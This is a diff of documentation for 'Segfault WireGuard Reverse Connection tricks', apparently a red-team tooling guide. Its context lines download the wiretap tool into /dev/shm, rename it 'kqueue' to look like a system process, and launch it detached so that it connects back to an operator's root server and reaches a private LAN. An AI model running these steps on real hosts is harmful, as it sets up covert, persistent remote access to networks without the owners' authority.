@@ -22,7 +22,6 @@ description: Segfault WireGuard Reverse Connection tricks.
 cd /dev/shm
 curl -fsSL https://github.com/sandialabs/wiretap/releases/download/v0.2.1/wiretap_0.2.1_linux_amd64.tar.gz | tar xfz - -O >kqueue
 PATH=.:$PATH
-ulimit -n $(ulimit -Hn)  # Set max open files to hardlimit
 setsid kqueue server --private ...
 ```
 
@@ -35,7 +34,7 @@ A deployed Wiretap will connect back to your [Root Server](../) indefinitely and
 __Step #1: Allocate a UDP port on your Root Server__
 
 ```shell
-curl rpc/net/init
+curl http://rpc/net/init
 ```
 
 Take note of the *port*. The UDP Port is now associated with your [Root Server](../). Ignore the rest.
@@ -67,7 +66,7 @@ __Step #3: Access the Network__
 On your [Root Server](../):
 
 ```
-curl rpc/net/up -d name=PrivLAN31337 -d private=<PrivateKey> -d exit_public=<PublicKey>
+curl http://rpc/net/up -d name=PrivLAN31337 -d private=<PrivateKey> -d exit_public=<PublicKey>
 ```
 
 ## Contact
